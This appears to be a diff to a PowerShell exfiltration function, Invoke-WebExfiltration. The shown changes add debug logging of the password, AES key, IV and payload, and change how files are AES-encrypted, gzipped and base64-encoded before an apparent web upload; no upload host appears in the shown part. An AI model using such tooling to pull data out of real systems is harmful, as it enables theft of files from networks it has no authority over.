@@ -88,6 +88,7 @@ Function Invoke-WebExfiltration {
             break
         }
 
+        Write-Debug "Plaintext password: '$Password'"
         Write-Host "[-]"
     }
 
@@ -103,25 +104,45 @@ Function Invoke-WebExfiltration {
         $file_name = [System.IO.Path]::GetFileName($file)
         $file_bin = [IO.File]::ReadAllBytes($file)
 
+
+         if ($true){
         Write-Verbose "AES-256 encrypting '$file_name' (Block: 128 Bit)"
 
          # AES encrypt
          # Source: https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
         $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
-
         $aesManaged = New-Object System.Security.Cryptography.AesManaged
-        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
         $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
         $aesManaged.BlockSize = 128
         $aesManaged.KeySize = 256
+
+        $password_sha256 = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Password))
+        $aesManaged.Key = $password_sha256
+
+
+        # Write-Debug "Key SHA256 Dec: $($aesManaged.Key)"
+        Write-Debug "Key SHA256 Hex: $([System.BitConverter]::ToString($aesManaged.Key).Replace('-', ''))"
+        Write-Debug "Key length:     $($aesManaged.KeySize) Bit ($($aesManaged.KeySize/8) Byte)"
+        # Write-Debug "AES IV Dec:     $($aesManaged.IV)"
+        Write-Debug "AES IV Hex:     $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', ''))"
+        Write-Debug "AES IV length:  $([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4) Bit ($([System.BitConverter]::ToString($aesManaged.IV).Replace('-', '').length*4/8) Byte)"
 
         $encryptor = $aesManaged.CreateEncryptor()
         $file_bin_encrypted = $encryptor.TransformFinalBlock($file_bin, 0, $file_bin.Length)
         $file_bin_encrypted = $aesManaged.IV + $file_bin_encrypted
+
+        Write-Debug "IV+AES-256 Hex: $([System.BitConverter]::ToString($file_bin_encrypted).Replace('-', ''))"
+        # Write-Debug "IV extracted: $($([System.BitConverter]::ToString($file_bin_encrypted[0..15]).Replace('-', '')))"
+
         $aesManaged.Dispose()
 
         Write-Verbose "AES-256 encrypted '$file_name'"
+
+        }else {
+
+             $file_bin_encrypted = $file_bin
+         }
 
         # Gzip compress content
         # Undo: cat LICENSE.gzip.b64 | base64 -d | gzip -d
@@ -135,9 +156,10 @@ Function Invoke-WebExfiltration {
 
         # convert to base64 string
         $gzip_b64 = [Convert]::ToBase64String($ms.ToArray())
+        Write-Debug "Base64: $gzip_b64"
         $ms.Close()
 
-        $gzip_b64 | Out-File "$file_bin.aes256.gzip.b64"
+        # $gzip_b64 | Out-File "$file.aes256.gzip.b64"
 
         # ToDo: Add secrent as an HTTP header, like an API key so unrestricted people can't upload?
 
